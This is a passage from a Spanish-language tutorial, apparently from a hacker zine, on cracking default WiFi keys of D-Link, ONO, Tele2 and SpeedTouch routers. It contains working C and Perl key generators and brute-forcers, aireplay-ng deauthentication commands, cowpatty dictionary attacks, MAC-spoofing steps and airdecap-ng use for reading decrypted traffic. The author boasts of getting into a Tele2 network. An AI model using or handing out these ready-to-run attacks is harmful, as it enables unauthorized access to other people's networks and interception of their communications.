+deseas crear. Aqui teneis el codigo.
+
+ **--------------------------------------------------------------------------**
+
+   #include <stdio.h>
+
+   /* Por aquello de hacerlo mas intuitivo */
+   #define P1 0
+   #define P2 1
+   #define P3 2
+   #define P4 3
+   #define P5 4
+   #define P6 5
+
+   int main(int argc, char *argv[])
+   {
+      FILE *dic;      /* Archivo de salida */
+      int mac[6];     /* Direccion MAC     */
+      int n, var;     /* Variables Utiles  */
+
+      if (argc < 3) {
+         fprintf(stderr, "Usage: ./ddlink XX:XX:XX:XX:XX:XX archivo_salida\n");
+         exit(0);
+      }
+
+      /* Leemos la MAC en el formato correcto*/
+
+      n = sscanf(argv[1], "%02x:%02x:%02x:%02x:%02x:%02x", &mac[0], &mac[1],
+                                                           &mac[2], &mac[3],
+                                                           &mac[4], &mac[5]);
+
+      dic = fopen(argv[2], "w"); /* Abrimos archivo para escritura*/
+
+      /* Generamos todas las posibles claves */
+
+      for (var = 0; var < 256; var++) { 
+
+         fprintf(dic, "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
+                       mac[P6], mac[P1], mac[P5], mac[P2],
+                       mac[P3], mac[P4], mac[P6], mac[P5],
+                       mac[P2], mac[P3], mac[P4], mac[P1], var);
+      }
+
+      printf("\nEl diccionario ha sido creado correctamente\n");
+
+      printf("\nLa clave mas probable es: ");
+      printf("%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n\n",
+              mac[P6], mac[P1], mac[P5], mac[P2],
+              mac[P3], mac[P4], mac[P6], mac[P5],
+              mac[P2], mac[P3], mac[P4], mac[P1], mac[P3]);
+
+      fclose(dic);
+      return 0;    /* BYE */
+   }
+
+ **--------------------------------------------------------------------------**
+
+A parte de generar el diccionario me permito imprimir por pantalla la que 
+posiblemente pueda ser la clave correcta sin tener que hacer uso del aircrack(-ng).
+
+
+
+---[ 3.7 - Ataque a ONO (P123456789)
+
+En cierta ocasion encontre una red de este tipo, pero por desgracia no pude
+demostrar la vericidad de lo que aqui se va a contar.
+
+La cuestion, segun parece, es que a los de ONO no se le ha ocurrido mejor idea
+que tomar como contrasenya por defecto para este tipo de redes, el numero que
+se encuentra despues de la "P" de su ESSID restandole 1.
+
+Es decir:
+
+   - Si la red se llama "P623894175"
+   - La clave seria "623894174"
+
+En otro lugar se ha dicho que este ultimo numero (el que tomamos como clave),
+debe ser pasado como parametro a un programa llamado:
+
+   - Thomson Pass-Phrase Generator
+
+Programa que por cierto no he podido encontrar por mas que he buscado. Si teneis
+noticias de el, ya sabeis, mail-me.
+
+Se supone que es entonces cuando realmente se genera la clave realmente valida.
+Pero, de todos modos, hay quien ha comprobado que este paso no es necesario y
+que la simple resta produce la clave adecuada.
+
+
+
+---[ 4 - Romper WPA (no de momento pero...)
+
+WPA no se puede romper (de momento). Y aunque haya empezado con una afirmacion
+tan contundente, no desesperes. El asunto radica en que no todas las redes
+protegidas con el algoritmo WPA utilizan contrasenyas realmente seguras ni, lo
+que es peor todavia, aleatorias.
+
+A partir de aqui perseguiremos una consigna:
+
+   - Si puedes encontrar un patron, puedes encontrar una clave.
+
+Pero para poder testear claves contra este tipo de cifrado, si que hay algo
+que precisaremos obligatoriamente: El tan nombrado "handshake".
+
+Este no es ni mas ni menos que el proceso de conexion de un cliente con el
+punto de acceso que contiene informacion primordial sobre la clave. Para
+capturar una paquete de este tipo nada mas que debemos esperar con nuestro
+amigo el "airodump(-ng)" a que un cliente autorizado se asocie correctamente
+al router. Pero la gente a veces no tiene paciencia y entonces echan mano
+de "aireplay(-ng)".
+
+Como? Pues ejecutando un ataque de desautentificacion:
+
+   1 - Nos ponemos a capturar paquetes:
+     
+     $ airodump-ng --bssid 00:01:02:03:04:05 -c 11 -w psk ath1
+
+   2 - Realizamos el ataque en concreto:
+
+     $ aireplay-ng -0 5 -a 00:01:02:03:04:05 -c 11:22:33:44:55:66 wifi0
+
+     -0 o --deauth -> Desautenticacion.
+     5             -> El numero de intentos antes de detenerse.
+
+
+Dejamos corriendo el airodump para capturar paquetes de ese punto de acceso,
+cuando un cliente reconecte, arriba a la derecha veremos la frase:
+
+   - 'Handshake 00:01:02:03:04:05'
+
+A veces se tarda un rato en conseguir este paquete especial, pero el truco
+esta en repetir el ataque 2 de forma intermitente, para dar tiempo a reconectar
+al cliente.
+
+
+------
+|TKIP|
+------
+
+Bueno, no me detendre a contaros toda la historia, dado que aqui [6] la
+comprendereis sin duda al detalle.
+
+De esto me entere por primera vez, tranquilo en mi trabajo, cuando suena la
+campanilla de mi gestor de correo avisandome de que un mensaje nuevo espera
+calentito en la bandeja de entrada. Directamente veo que se ha filtrado hacia
+la carpeta "Hispasec" donde almaceno todas los noticias sobre las ultimas en
+seguridad informatica que recibo de "Una-al-dia".
+
+Quizas una nueva actualizacion de los productos de Bill, tal vez nuevos
+paquetes disponibles para SuSE, o una ejecucion de codigo arbitrario o
+denegacion de servicio en x programa, modulo y. Pero no! Asombrosamente
+TKIP y WPA heridos de muerte, tocate la vaina como dicen los de por ahi.
+
+He aqui el punto mas importante del asunto:
+
+"Un ataque basado en la misma tecnica que volvio obsoleto al WEP (ataque
+conocido como chopchop) ha permitido que se pueda descifrar un paquete de
+tipo ARP en menos de 15 minutos, independientemente de la contrasenya usada
+para proteger el WPA."
+
+Como bien sabemos WPA puede utilizar por el momento dos tipos de cifrado
+que son TKIP o AES, pero por suerte para aquellos que se autodenominan
+"auditores de redes wireless", suele ser el primero el que se encuentra
+presente en la fiesta la mayoria de las ocasiones.
+
+De momento, y para los que se hayan emocionado, decir que todavia no es
+posible obtener la clave de la red directamente como se hacia con WEP.
+Los posibilidades a dia de hoy son la de inyectar paquetes para provocar
+una denegacion de servicio o incluso redirigir el trafico (que no es
+poco a decir verdad).
+
+
+
+---[ 4.1 - Ataque a TELE2
+
+Todo fue como una especie de proyecto para recolectar contrasenyas por defecto
+de esta clase de routers. El objetivo era, como siempre, sacar el patron que
+las generaba.
+
+Luego empezaron a aparecer suposiciones:
+
+   - Los unos dijeron que sus contrasenyas empezaban por la cadena "IX1V"
+     seguido de 7 digitos cualesquiera.
+
+   - Los otros que empezaban por "IX1V7", con este ultimo digito constante,
+     y otros 6 cualesquiera.
+
+   - Y los ultimos dijeron que sus contrasenyas empezaban por la raiz "IX1VP"
+
+Sea como fuere, mas adelante se descubrio que los del segundo grupo habian
+adquirido el router, absolutamente todos ellos, durante el anyo 2007.
+
+A partir de aqui se decidio que, como siempre, lo principal era crear un
+diccionario con todas las posibilidades. Como se puede deducir los que empiezan
+por la raiz "IX1V7" tardan una decimar parte en crearse que los que empiezan
+por "IX1V" (aunque este ultimo abarca todas las posibilidades, siempre que lo
+que siga sean digitos y no otros caracteres).
+
+Para crear tal diccionario algunos se decidieron por hacer uso de la siguiente
+herramienta. He copiado aqui el script, pues solo lo he visto referenciado en
+este lugar [7] y seria una verdadera pena que se perdiera en el olvido.
+
+
+ **--------------------------------------------------------------------------**
+
+#!/usr/bin/perl
+
+=head1 NAME
+
+wg.pl
+
+=head1 AUTHOR
+
+Matteo Redaelli
+E-MAIL: matteo.redaelli@libero.it
+WEB:    http://digilander.iol.it/reda
+
+=head1 DESCRIPTION
+
+This is a Word Generator: you can apply some useful options to filter the 
+words
+
+=head1 USAGE
+
+type   perl wg.pl -h
+
+=head1 HISTORY
+
+2000-01-06: the first lines of this script
+2000-01-11 added getopt
+2000-01-21: adjusted default parameters
+2002-03-05: new option -n
+2002-03-06: new option -s
+2002-03-07: reorganization of all source code, more documentation
+
+=head1 LICENSE
+
+This package is free software; you can redistribute it and/or
+modify it under the same terms as Perl itself, i.e., under the
+terms of the "Artistic License" or the "GNU General Public License".
+
+=head1 DISCLAIMER
+
+This package is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+See the "GNU General Public License" for more details.
+
+=cut
+
+use Getopt::Std;
+use strict;
+#use integer;
+
+sub char2string
+{
+# string generator: if I pass 'a' and 5, I'll get 'aaaaa'
+	sprintf "%s", @_[0]  x @_[1];
+}
+
+sub occurs
+{
+  my $pat = @_[0];
+  my $astring = @_[1];
+
+  my $tot = $astring =~ s/$pat//g;
+
+#	print "tot $tot\n";
+#
+  return $tot;
+}
+
+sub few_repeatitions
+{
+   my $astring = @_[0];
+   my $max = @_[1];
+   my $len =  length( $astring );
+   my $tot = 0;
+
+   my $mid = int( $len / 2);
+
+
+   for ( my $step = 2; $step <= $mid; $step++) {
+      for ( 0 .. $len - $step ) {
+	my $letters = substr( $astring, $_, $step);
+#	print "$letters\n";
+	$tot = occurs( $letters, $astring);
+	return $tot if $tot > $max;
+     }
+   }  
+   return 0;
+}
+
+sub nple
+{
+   my $astring = @_[0];
+   my $len = length( $astring );
+   my $tot = 0;
+   my $in = 0;
+   my $last = ' ';
+
+        for ( 0 .. $len - 1) {
+           my $letter = substr( $astring, $_, 1);
+
+           # print "$astring  $letter $last\n";
+             if ( ($letter cmp $last)  == 0) {
+           # print "$letter =  $last, $in, $tot";
+                if ($in == 0) {
+                   $in = 1;
+                   $tot++;
+                }
+			
+             } else {
+                $in = 0;
+             }		
+
+             $last = $letter;
+        }
+        return $tot;
+}
+
+sub substring
+{
+   my $string1 = @_[0];
+   my $string2 = @_[1];
+
+   $_ = $string2;
+
+   if ( /$string1/ ) {
+      return 0;
+   } else {
+      return 1;
+   }
+}
+
+my %opts;
+
+getopts('a:c:ehl:n:o:r:tu:v:z:',  \%opts);
+
+usage(0) if $opts{'h'};
+$opts{'u'} and $opts{'v'} or usage(1);
+
+# setup parameters
+
+my $va_list = $opts{'v'};
+my @va_list = split( //, $va_list ); # convert string to an array
+
+my $min_depth = $opts{'l'} ? int($opts{'l'}) : 1;
+my $max_depth = $opts{'u'} ? int($opts{'u'}) : 1;
+
+usage(2) if $min_depth > $max_depth;
+
+my $prefix = $opts{'a'} ? $opts{'a'} : '';
+my $postfix = $opts{'z'} ? $opts{'z'} : '';
+my $max_occurs = $opts{'o'} ? int($opts{'o'}) : $opts{'u'};
+my $max_cons = $opts{'c'} ? int($opts{'c'}) : $opts{'u'};
+my $max_nple =  $opts{'n'};
+my $max_reps =  $opts{'r'};
+
+usage(3) if $min_depth < 1 || 
+	$max_depth < 1 || 
+	$max_occurs < 1 || 
+	$max_cons < 1 || 
+	$max_nple < 0 || 
+	$max_reps < 0;
+
+if ($opts{'t'}) { 
+   print "Options:\n";
+   foreach my $key (sort keys %opts) {
+      print "$key -> $opts{$key}\n";
+   }
+   print "Global vars:\n";
+   print_vars();
+}
+
+for ($min_depth..$max_depth) {
+   wg( $_, "");
+}
+
+sub print_vars
+{
+   print "min_depth = $min_depth\n";
+   print "max_depth =  $max_depth\n";
+   print "max_occurs = $max_occurs\n";
+   print "max_cons = $max_cons\n";
+   print "max_nple = $max_nple\n";
+   print "max_reps = $max_reps\n";
+}
+
+#
+# word generator
+#
+sub wg
+{
+   my $max_depth = @_[0];
+   my $myprefix = @_[1];
+   my $elem;
+
+   if ($max_depth == 0 ) {
+      print "$prefix$myprefix$postfix\n";
+      if ( $opts{e} == 1) {
+         system "$prefix$myprefix$postfix\n";
+      }
+   }
+   else {
+      # print " n = $opts{'n'} r = $opts{'r'} \n";
+
+      # suggestion: the generation of the words is more variuos if
+      # I change the order of the list of the letters (@va_list)
+
+      foreach $elem (@va_list) {
+
+         my $newstring = "$myprefix$elem";	
+
+         return if ( $opts{'c'} && 
+         substring(char2string( $elem , $max_cons), $myprefix ) == 0);
+         return if ( $opts{'n'} && nple( $newstring ) > $max_nple);
+         return if ( $opts{'r'} &&
+         few_repeatitions( $newstring, $max_reps) != 0  );
+         return if ( $opts{'o'} && occurs( "$elem", $newstring) > $max_occurs ); 
+         wg( $max_depth -1, "$myprefix$elem");
+      }
+   }
+}
+
+sub usage
+{
+   my $rc = @_[0];
+
+   die <<END_USAGE
+
+   USAGE: perl $0 options
+
+   options are:
+   -a string: prefix
+   -c number: max consecutive letters (how many consecutive 'a' do you want?)
+   -e : submit the output string to the operating system
+   -h : help
+   -l number: min length of the word
+   -o number: max number of occurrencies of a letter 
+   -n number: max number of n-ple  (AA, BBB, CCC, DDDD)
+   -r number: max number of repeatitions (ABCABABBCDBCD has 5 repeatitions:
+                                          3 reps of AB and 2 of BCD)
+   -t : trace on
+   -u number: max length of the word
+   -v string: list of valid characters (es, "01" "abcdef")
+   -z string: postfix
+
+   possible return code are:
+      0, ok
+      1, not all parameters
+      2, min length (-l) is greater than max lenght (-u)
+      3, at least one parameter is lower than 1
+   Return code: $rc
+   END_USAGE
+}
+
+ **--------------------------------------------------------------------------**
+
+Su uso viene como sigue:
+
+   $ perl wg.pl -a IX1V -v 0123456789 -l 7 -u 7 >> dic_tele2.txt
+
+o para los del anyo 2007:
+
+   $ perl wg.pl -a IX1V7 -v 0123456789 -l 6 -u 6 >> dic_tele2_07.txt
+
+Como es habitual, este diccionario puede ser utilizado directamente con la
+opcion "-w" de aircrack; pero este proceso es muy lento, apenas prueba unos
+cientos de claves por segundo.
+
+Pero entonces aparecio el programa "Cowpatty" [] acompanyado de la utilidad
+"genpmk".
+
+Esta ultima se encarga de pasar el listado de claves posibles que generamos
+en el paso anterior a un formato que pueda entender su amigo Cowpatty con
+las "primary master key" ya precalculadas. Se ejecuta mas o menos asi:
+
+   $ genpmk -f dic_tele2.txt -d tele2.dic -s Tele2
+
+Lo mejor de todo es que a medida que vas generando el nuevo diccionario
+precalculado, lo puedes ir testeando contra un archivo de capturas que al
+menos contenga un handshake. Aqui el comando:
+
+   $ cowpatty -r captura.cap -d tele2.dic -s Tele2
+
+Probara tantas claves como las que hayan sido generadas hasta el momento,
+en caso de tenerlas todas, claro esta, pues probara el diccionario entero.
+A que velocidad? Yo llegue a rondar las 150.000 claves por segundo. Ahi
+es nada.
+
+Mi prueba personal, que cuando "genpmk" ya habia generado desde la clave
+"IXV0000000" hasta la "IXV3497381" lo probe contra el archivo de capturas
+y me dijo que ninguna de ellas coincidia.
+
+Como el proceso de generacion del diccionario lleva unas cuantas horas aun
+sobre un Core 2 Duo... pues decidi parar "genpmk" y crear tan solo el
+diccionario de las claves cuya raiz tenian "IX1V7" (los creados en el 2007).
+
+Cuando lo hube generado por completo lo probe de nuevo mediante "Cowpatty"
+y por desgracia obtuve la misma respuesta, NADA. Pero no habia que
+desesperar, estamos cerca del anyo 2009, es decir, que muchos de los routers
+que se encuentran hoy activos han sido adquiridos en el 2008. Siguiendo
+esta filosofia pense que quizas la raiz de sus claves comenzaran por "IX1V8".
+
+Y no espere mas, cree el diccionario correspondiente para estas combinaciones
+de claves. En conjunto hice lo siguiente:
+
+   $ perl wg.pl -a IX1V8 -v 0123456789 -l 6 -u 6 >> dic_tele2_08.txt
+   $ ./genpmk -f dic_tele2_08.txt -d tele2_08.dic -s Tele2
+   $ ./cowpatty -r captura.cap -d tele2_08.dic -s Tele2
+
+Y obtuve mi premio:
+
+   The PSK is: [ IX1V8748132 ]
+
+Lo comprobe, y perfecto!!! Acceso a Internet mediante router Tele2.
+
+
+
+---[ 4.2 - Ataque a SpeedTouch
+
+En este caso no existe un patron concreto, pero si una norma; y es que la clave
+se genera a partir de el "numero de serie" que posea el punto de acceso.
+
+Ahora explicamos. Imaginese usted que el numero de serie de su punto de acceso
+es el siguiente:
+
+   CP0723JT385(34)
+
+Bien, ahora separaremos los diferentes campos:
+
+   CP  -> Simpre igual             -> CP
+   YY  -> Anyo de fabricacion       -> 07
+   WW  -> Semana del anyo           -> 23
+   PP  -> Codigo de produccion     -> JT
+   XXX -> 3 digitos aleatorios (*) -> 385
+   CC  -> Codigo de configuracion  -> 34
+
+(*) Decimos que 'XXX' son numeros aleatorios, pero esto es para nuestros
+    propositos; pues en realidad podria representar el numero de unidad
+    del punto de acceso.
+
+Para obtener la clave se sigue ahora este proceso:
+
+   1 -> Se eliminan los campos 'CC' Y 'PP', nos queda:
+
+        CP0723385
+
+   2 -> Los 3 ultimos digitos (XXX) se pasan a hexadecimal:
+
+        CP0723333835
+
+   3 -> Se aplica el algoritmo SHA-1 a lo que teniamos:
+
+        742da831d2b657fa53d347301ec610e1ebf8a3d0
+
+Resultados:
+
+   1 -> Los 3 ultimos bytes (6 caracteres en ascii) se anyaden a la palabra
+        "SpeedTouch" para formar el ESSID correspondiente al punto de acceso.
+
+        "SpeedTouchF8A3D0"
+
+   2 -> Los 5 primeros bytes (10 caracteres en ascii) conforman la clave por
+        defecto para nuestra red.
+
+        "742DA831D2"
+
+Hasta aqui todo correcto, el asunto es el que tenemos entre manos, si obtenemos
+un numero de serie, podemos calcular su contrasenya. Pero esta situacion es rara
+a menos que estemos analizando nuestra propia red o la de algun vecino que nos
+haya dado permiso.
+
+La pregunta es sencilla: Que hace un "hacker/cracker" cuando quiere averiguar
+algo que se encuentra dentro de un rango de posibilidades?
+
+Muy cierto, utilizan la "FUERZA BRUTA". El objetivo es crear todos los numeros
+de serie posibles para un anyo en concreto sin los campos 'CC' Y 'PP' y, despues
+de pasarlo por el algoritmo de cifrado SHA-1, se comparan los 3 ultimos bytes
+con la terminacion de la ESSID (nombre de la red) que deseamos romper.
+Caso de coincidir, significa que los primeros 5 bytes se corresponden con la
+clave por defecto para la red SpeedTouch. 
+
+Por suerte, alguien ya ha hecho este trabajo por nosotros, y el resultado lo
+podemos encontrar aqui [5] y el codigo fuente para su estudio en este otro
+lugar [6].
+
+Como ya referenciamos tanto el ejecutable como el codigo fuente, aqui solo hare
+un copy-paste de la funcion principal para explicar un poco por encima que es lo
+que realmente hace.
+
+En realidad es un ataque por fuerza bruta que en principio no dura demasiado
+tiempo (muy poco en realidad) y, segun su autor, se puede optimizar si utilizamos
+las funciones criptografias proporcionadas por OpenSSL para el uso de SHA-1.
+
+ **--------------------------------------------------------------------------**
+
+int main(int argc, char **argv) {
+
+    u8 sha1_digest[40]={0};
+    u8 ssid[8]={0},buf[8]={0},year,week,x1,x2,x3;
+    u32 keys = 0,ssidLen = 0,verbose = 0, opt = 0;
+    u8 *p,*q,*strId = NULL;
+    FILE *ofile = NULL;
+
+    SHA1_CTX sha1_ctx;
+
+    if(argc > 1) {
+      while( (opt = getopt(argc, argv,"vo:i:")) != -1) {
+
+        switch(opt) {
+
+          case 'i' :
+            strId = optarg;
+            break;
+
+          case 'o' :
+            if((ofile = fopen(optarg,"wb")) == NULL) {
+              fprintf(stderr,"\nNo puedo abrir %s para la salida.\n",optarg);
+              return(0);
+            }
+            break;
+
+          case 'v' :
+            verbose++;
+            break;
+
+          default:
+            usage(argv);
+        }
+      }
+
+      if(!strId) usage(argv);
+
+      if(!(ssidLen = str2ssid(ssid,strId))) usage(argv);
+
+      fprintf(stdout,"\nGenerando claves... por favor espera\n\n");
+
+        // generate values only for 2005/2007..change if you want.
+
+        for(year = 5;year <= 7;year++) {
+
+          serial[3] = year | '0';
+
+          // 52 weeks of the year
+
+          for(week = 1;week <= 52;week++) {
+            
+            serial[4] = (week / 10) + '0';
+            serial[5] = (week % 10) + '0';
+
+            for(x1 = 0;x1 < 36;x1++) {
+
+              serial[6] = hexmsb(charTable[x1]);
+              serial[7] = hexlsb(charTable[x1]);
+
+              for(x2 = 0;x2 < 36;x2++) {
+
+                serial[8] = hexmsb(charTable[x2]);
+                serial[9] = hexlsb(charTable[x2]);
+
+                for(x3 = 0;x3 < 36;x3++) {
+
+                  serial[10] = hexmsb(charTable[x3]);
+                  serial[11] = hexlsb(charTable[x3]);
+
+                  // hash serial number with sha-1
+
+                  SHA1Init(&sha1_ctx);
+                  SHA1Update(&sha1_ctx,serial,SERIAL_LENGTH);
+                  SHA1Final(&sha1_ctx,sha1_digest);
+
+                  // compare SSID octets with last number of bytes supplied
+
+                  if(memcmp(&sha1_digest[(20-ssidLen)],ssid,ssidLen) == 0) {
+
+                    keys++;
+
+                    if(verbose) {
+
+                      memcpy(buf,serial,6);
+
+                      fprintf(stdout,
+                              "Número de Serie: %s**%C%C%C - posible clave = ",
+                              buf,charTable[x1],charTable[x2],charTable[x3]);
+
+                      dump_key(stdout,sha1_digest);
+                    }
+                    if(ofile) {
+                      dump_key(ofile,sha1_digest);
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      fprintf(stdout,"\nResultado: %d posibles claves.\n\n",keys);
+
+      if(ofile) fclose(ofile);
+    }
+    else {
+        usage(argv);
+    }
+    return(0);
+}
+ **-------------------------------------------------------------------------**
+
+Como parametro se pide el ESSID de la red SpeedTouch que queremos crackear.
+
+Antes de nada es importante saber que los numeros de serie que se van generando
+se guardan temporalmente en este array:
+
+u8 serial[13]={'C','P','0',0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+
+De esta manera ya tenemos los dos primeros caracteres establecidos y solo
+tenemos que ir rellenando los campos restantes.
+
+El motor principal es una serie de bucles 'for(;;)' que van generando los
+diferentes campos que componen el numero de serie:
+
+   - El 1º genera el anyo, fijate que va del '2005' al '2007'; pero se ha
+     comprobado que existen routers fabricados en el '2004' y dado que hoy
+     ya estamos en el '2009' deberias jugar con estos numeros para ampliar
+     tus posibilidades. Cuantos mas anyos, mas se tarda en generar todas las
+     posibles claves.
+
+   - El 2º recorre todas las semanas del anyo.
+
+   - El 3º, 4º y 5º generan los posibles valores para 'XXX'.
+
+Despues se genera el hash SHA-1 correspondiente para cada numero de serie
+con una implementacion que biene en los propios fuentes del programa.
+
+Por ultimo, y como ya hemos dicho, se comparan los ultimos bytes de este
+hash con los del ESSID y, si coinciden, se imprime en pantalla la posible
+clave. Digo posible puesto que, aunque no lo creas, puedes obtener varias
+claves posibles (normalmente 2 a lo sumo) de las cuales tendras que comprobar,
+de forma manual, cual es la correcta.
+
+
+
+---[ 4.3 - Que pasa con LiveBox?
+
+Pues de momento, y sintiendolo mucho, no pasa nada.
+
+El caso es que unos franceses colgaron en "Youtube" [8] unos cuantos videos
+que mostraban como romper estas claves utilizando un diccionario del mismo
+modo que se habia hecho para las redes Tele2.
+
+Claro, la cuestion es que solo ellos poseian tal diccionario y lo vendian
+a sabe dios que precio en una pagina que aqui no mostrare por cuestiones
+eticas (que era un timo vamos, o eso al menos comentaron quienes tuvieron
+la genial idea de hacer caso a esta gente).
+
+Los videos no estan falsificados. Si yo tengo un punto de acceso de la marca
+"LiveBox" y se su contrasenya por defecto, me hago un diccionario enorme con
+codigos aleatorios, entremedias introduzco mi clave correcta, y si lo pruebo
+contra un archivo de capturas esta claro que en algun momento le tocara el
+turno a la nuestra y "aircrack(-ng)" nos dira que hemos acertado de pleno.
+
+Siento la decepcion, pero hasta el momento, y a la espera de estudios mas
+profundos, estas redes se encuentran cerradas a nuestros encantos.
+
+
+
+---[ 5 - Evadir ESSID ocultos
+
+Multitud de veces nos encontramos con redes cuyo ESSID aparece como oculto y
+nos impide realizar la conexion a esa red aun disponiendo de la clave adecuada
+a la misma.
+
+Hoy por hoy esto no sera un impedimiento para nosotros. El estandar 802.11,
+solo obliga a cifrar los paquetes que contienen datos, aquellos otros de control
+podrian viajar en texto plano.
+
+Que paquetes de control? Pues la mayoria de las redes emiten tramas en "broadcast"
+donde se puede leer el ESSID tranquilamente. Hay quien se encarga de deshabilitar
+esta caracteristica en sus puntos de acceso; pero tenemos mas salida, nadie puede
+impedir que leamos los paquetes de asociacion o reasociacion de los clientes contra
+la red, en estas tramas el nombre del AP tambien viaja sin cifrar.
+
+Una de dos: Podemos esperar pasivamente a que un cliente legitimo se conecte a la
+red. O si somos un poco mas impacientes provocar una reasociacion con nuestro amigo
+aireplay en un ataque de des-autenticacion.
+
+En realidad no tienes mas que poner tu sniffer preferido a escuchar (aqui Wireshark
+puede ser tu mejor compa�ia) y saber leer en el lugar adecuado. Una vez que te
+acostumbras a leer las cabeceras de todos los protocolos, tus ojos sabran de forma
+exacta donde deben mirar. 
+
+
+
+---[ 6 - Suplantacion de MAC
+
+Has descubierto la contrasenya de una red protegida con el algoritmo WPA y te
+dispones a asociarte a la red; pero tu conexion no llega a establecerse e
+incluso desde tu MacBook recibes un mensaje mas especifico indicando que la
+red posee una lista de control de acceso por MAC en la que tu direccion no se
+encuentra. En resumen, no puedes entrar porque no estas autorizado.
+
+Eso ya no es problema a estas alturas: Que tal se te da hacerte pasar por otra
+persona?
+
+A dia de hoy la direccion MAC de nuestra interfaz de red se puede establecer
+a traves de software. Esta es la ventaja que aprovecharemos para hacerle creer
+a nuestro Sistema Operativo que la MAC de nuestra tarjeta es la de un usuario
+que si este realmente autorizado.
+
+Deberias tener la MAC de este cliente autorizado puesto que si has conseguido
+una contrasenya WPA, habras estado esperando por un paquete de autentificacion
+y por tanto hay un cliente activo.
+
+En caso contrario no tienes mas que arrancar el "airodump(-ng)" filtrando por
+el canal de la red que deseas y el parametro "--bssid". Cuando veas que un
+cliente mueve trafico en esa red, apunta su direccion MAC en un papel o en un
+archivo de texto.
+
+
+SUPLANTACION EN LINUX / MAC OS X
+--------------------------------
+
+Muy sencillo o utilizas un programa destinado a tal fin que hayas encontrado
+en la red, o ejecutas directamente el siguiente comando:
+
+   $ sudo ifconfig interfaz hw ether XX:XX:XX:XX:XX:XX
+
+Si tienes una tarjeta con chip "atheros" y la direccion que has apuntado en
+el papel es: 00:B3:A9:CA:5F:11. El comando seri:
+
+   $ sudo ifconfig ath0 hw ether 00:B3:A9:CA:5F:11
+
+En mac podrias necesitar eliminar el parametro "hw" para que funcione
+correctamente.
+
+
+SUPLANTACION EN WINDOWS
+-----------------------
+
+Utiliza un programa como Smac [9] que hara todo el trabajo sucio por ti, o
+editas directamente el registro de windows.
+
+Clave para Win XP:
+
+   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\
+   {4D36E972-E325-11CE-BFC1-08002bE10318}
+
+Clave para Win 95/98:
+
+   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ClassNet
+
+Bien dentro de cualquiera de estos lugares deberias encontrar otras
+claves. La mayoria de ellas contienen a su vez otra clave en su interior
+llamada "DriverDesc" que contiene el nombre de la interfaz a que se
+refiere. Busca entonces cual de ellas se refiere a tu tarjeta de red
+inalambrica. Cuando la hayas encontrado crea una nueva clave en el mismo
+sitio. Asi:
+
+   Clave -> "NetworkAddress"
+   Valor -> "XXXXXXXXXXXX" -> Direccion MAC en hexadecimal sin puntos.
+
+Existe una funcion que se encarga de leer esta direccion, su nombre es
+"NdisReadNetworkAddress". Para que tus cambios surjan efecto no tienes
+mas que reiniciar el PC o, mas facil todavia, deshabilitar y volver a
+habilitar tu adaptador de red (interfaz).
+
+
+
+---[ 7 - Espionaje Offline
+
+SUBT: O como usar airdecap(-ng)
+
+Bien, muchas veces no despejamos nuestra mente y no pensamos con claridad.
+Acabamos de entrar en una red, y lo primero que se nos ocurre es que para
+encontrar mas informacion interna quizas lo mejor sea utilizar un ataque
+Man in The Middle, pero esto mirado de forma fria es ser corto de miras.
+
+Por que? Como siempre, la respuesta es facil. El objetivo de un ataque
+MITM es obtener un trafico que en principio no iva destinado a nosotros.
+Acaso no es esto lo que ocurre cuando con airodump(-ng) capturamos los
+paquetes que estan moviendo los clientes de esa misma red? La respuesta
+es afirmatica, claro esta, y ademas, tenemos una clave que puede descifrar
+esos paquetes para que nuestro amigo "Wireshark" no diga que lo que le
+mandamos abrir es una parafernalia sin sentido alguno.
+
+Entonces junto a la suite "aircrack" vino a salvarnos la vida un companyero
+llamado airdecap(-ng) que hace el trabajo sucio por nosotros. Aqui su uso,
+para los que anyadir el parametro "--help" sea demasiado costoso (extraido
+de la web oficial):
+
+   airdecap-ng [opciones] <archivo cap>
+
+   Opcion  Param.  Descripcion
+   -l      no      elimina la cabecera de 802.11
+   -b      bssid   direccion MAC del punto de acceso
+   -k      pmk     WPA/WPA2 Pairwise Master Key en hexadecimal
+   -e      essid   Nombre de la red
+   -p      pass    Clave WPA/WPA2
+   -w      key     Clave WEP en hexadecimal
+
+Ejemplos de uso:
+
+Para descifrar una captura WEP:
+
+   airdecap-ng -w 11A3E229084349BC25D97E2939 wep.cap
+
+Para descifrar una captura WPA/WPA2:
+
+   airdecap-ng -e 'the ssid' -p passphrase  tkip.cap
+
+Y por lo demas no tiene mas ciencia, el resultado se guaradara en un archivo
+"decap" y podremos abrirlo con nuestro analizador de trafico preferido,
+filtrando si asi lo deseamos por el protocolo que mas nos interese. Y aqui
+ya veo a muchos decidiendo por "HTTP" y "MSMSN" };-D
+
+
+
+---[ 8 - ERW o WifiSlax
+
+-----
+|ERW|
+-----
+
+Podeis obtenerlo aqui [10]
+
+Es un software desarrollado para el Sistema Opertivo Windows que enlaza
+una variedad de herramientas increibles para la auditoria de redes inalambricas.
+Su nombre completo es "Estudio de redes Wireless"; pero para que nos vamos
+enga�ar, como subtitulo podria llevar "rompe todo lo que puedas y mas"...
+
+Su autor "Eleaquin" a invertido una buena parte de su tiempo en recopilar todas
+estas utilidades y crear una interfaz que haga de su uso la mayor comodidad para
+el usuario de a pie.
+
+Aqui algunas de las caracteristicas que nos podemos encontrar:
+
+- Configuracion en modo monitor de la tarjeta inalambrica.
+- Suite Aircrack
+- Wlan Ripper (wlan)
+- Wlan Buster
+- DecSagem (adsl)
+- Dlink Wireless (clarito)
+- Stkeys (speedtouch)
+- Wintele2 (clarito)
+- AutoMagica
+- Ethereal (sniffer de trafico)
+- NetStumbler, detector de redes y nivel de se�al
+- Wireless Key View
+- Net Set Man
+- Etherchange
+- Conversor HEX/ASCII y viceversa
+- Card Check (consulta la compatibilidad de nuestro chip)
+- CPU Administrator
+- Tracer
+- Whois
+- MD5
+- Calculate
+- Backup
+- Files
+- Atw (administrador de tareas)
+- Yaps
+- Hexwrite
+- Notepad
+
+Alguien da mas?
+
+
+----------
+|WifiSlax|
+----------
+
